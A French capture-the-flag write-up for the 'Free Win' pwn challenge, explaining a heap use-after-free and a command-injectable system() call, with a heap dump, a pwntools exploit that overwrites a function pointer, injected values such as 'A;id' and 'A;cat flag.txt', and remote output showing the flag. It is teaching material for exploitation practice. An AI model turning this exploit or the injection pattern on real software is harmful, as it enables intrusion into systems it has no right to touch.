## PWN / Free Win

<p align="center">
  <img src="img/consignes.png" />
</p>

### Fichiers

- binaire : [free_win](free_win)
- libc : [libc-2.27.so](libc-2.27.so)
- code source : [free_win.c](free_win.c)


### Challenge

Comme le nom le laisse entendre, on risque de devoir jouer avec la heap : use after free, double free ...

Comme le code source est fourni on en profite, c'est beaucoup plus simple pour comprendre les différentes fonctionnalités, et on remarque que l'on retrouve les fonctions classiques d'un challenge use-after-free :
- `malloc`
- `free`
- modifier quelque chose
- exécuter quelque chose

Et bien évidemment le `free` est mal fait ... puisque le pointeur vers la zone mémoire libérée n'est pas remis à null.

Bonne pratique :

```c
free(ptr) ;
ptr = NULL;
```

Sans cela, la zone mémoire libérée est considérée disponible par l'allocateur de mémoire qui va la réutilisée, mais `ptr` pointant toujours dessus, il aura accès à des données qui ne le concernent pas initialement.

Pour plus d'info sur la gestion de la mémoire et les différents bin :
- https://beta.hackndo.com/use-after-free/
- https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580
- https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/



### Analyse

```bash
$ file free_win
free_win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9b3e2540dc61308ba5304b0f80172831b5af359a, not stripped

$checksec --file=free_win
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    No PIE
```

On remarque aussi la fonction suivante, qui n'est pas appelée par le programme :

```c
// Not used yet, but will be used in a later version as a choice between different functions
int execute_chunk_ping(char *buffer)
{
    char cmd[0x100] = {0};
    sprintf(cmd, "ping -c 1 %s", buffer);

    system(cmd);

    return 0;
}
```

Qui est vulnérable à une exécution de code arbitraire, puisque le buffer passé en argument est contrôlé par l'utilisateur sans vérification du programme.

En effet : `execute_chunk_ping("A;id")` fonctionne :

```bash
$ ping -c 1 A;id
ping: A: Nom ou service inconnu
uid=1000(mk) gid=1000(mk) ...
```

En analysant la heap lors des différentes allocations / libérations :

```c
struct
{
    char header[0x20]; // Not used yet, but will be used in order to specify the type of the entry
    int (*function)(const char *);
    char *buffer;
    int size;
} * entries[0x10] = {0};
```

```
0x603ac0:	0x0000000000000000	0x0000000000000000  // chunck 0 - header
0x603ad0:	0x0000000000000000	0x0000000000000000  
0x603ae0:	0x00007ffff7e5e5f0	0x0000000000603b00  <= *fonction + *buffer
0x603af0:	0x0000000000000020	0x0000000000000031  <= size (0x20)
0x603b00:	0x4141414141414141	0x4141414141414141  <= buffer
0x603b10:	0x4141414141414141	0x0000000000000000
0x603b20:	0x0000000000000000	0x0000000000000041

0x603b30:	0x0000000000000000	0x0000000000000000  // chunck 1 - header
0x603b40:	0x0000000000000000	0x0000000000000000
0x603b50:	0x00007ffff7e5e5f0	0x0000000000603b70
0x603b60:	0x0000000000000020	0x0000000000000031
0x603b70:	0x4242424242424242	0x4242424242424242
0x603b80:	0x4242424242424242	0x0000000000000000
0x603b90:	0x0000000000000000	0x0000000000000041

0x603ba0:	0x0000000000000000	0x0000000000000000  // chunck 2 - header
0x603bb0:	0x0000000000000000	0x0000000000000000  
0x603bc0:	0x00007ffff7e5e5f0	0x0000000000603be0
0x603bd0:	0x0000000000000020	0x0000000000000031
0x603be0:	0x4343434343434343	0x4343434343434343
0x603bf0:	0x4343434343434343	0x0000000000000000
0x603c00:	0x0000000000000000	0x0000000000020401
```


### Exploit

- allouer trois chunck avec des buffers de taille 0x10 octets : 0, 1 et 2
- libérer 2 puis 1, du coup les bin disponibles seront chaînés dans l'ordre `2 -> 1` pour l'allocateur
- allouer un chunck avec un buffer de taille 56 octets, l'allocateur va choisir le premier disponible à savoir `1`
- dans `1` la taille va nous permettre d'écraser l'ancienne `function` de `2` par `execute_chunk_ping()` que l'on pourra alors appeler grâce à l'ancien pointeur vers `2` qui n'aura pas été réinitialisé.
- lors de la libération de `2` le début du buffer est remis à 0, mais comme le pointeur est toujours utilisable, on peut réécrire note commande système dans le buffer
- appeler `execute_chunk_ping(buffer)` de `2`.


Pourquoi 56 octets pour la deuxième allocation ? Parce que si on demande plus, l'allocateur ne va pas utiliser un fastbin pour le buffer de la structure. Du coup la nouvelle structure sera bien écrite à l'emplacement pointé par `1`, mais le buffer est alloué plus loin dans la heap. Dans ce cas on ne peut pas écraser l'ancien `2`


```python
malloc(r, b'0', b'16', b'AAAAAAAA')
malloc(r, b'1', b'16', b'AAAAAAAA')
malloc(r, b'2', b'16', b'AAAAAAAA')
free(r,b'2')
free(r,b'1')
malloc(r, b'1', b'56', b'Z' * 32 + p64(execute_chunk_ping) )
edit_chunck(r, b'2', b'A;cat flag.txt')
execute(r, b'2')
```

- code : [free_win.py](free_win.py)

```bash
$ python3 free_win.py REMOTE
[*] '/home/mk/ctf_pwnme/pwn/free_win/free_win'
[+] Opening connection to pwn.pwnme.fr on port 7011: Done
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
b'sh: 1: ping: not found\n'
b'PWNME{aed472e0d91c1f5e6b8158f2a5e75d09}Welcome to FreeWin !\n\n  1.  Malloc\n  2.  Free\n  3.  Edit\n  4.  Execute\n\n >> '
[*] Closed connection to pwn.pwnme.fr port 7011
```
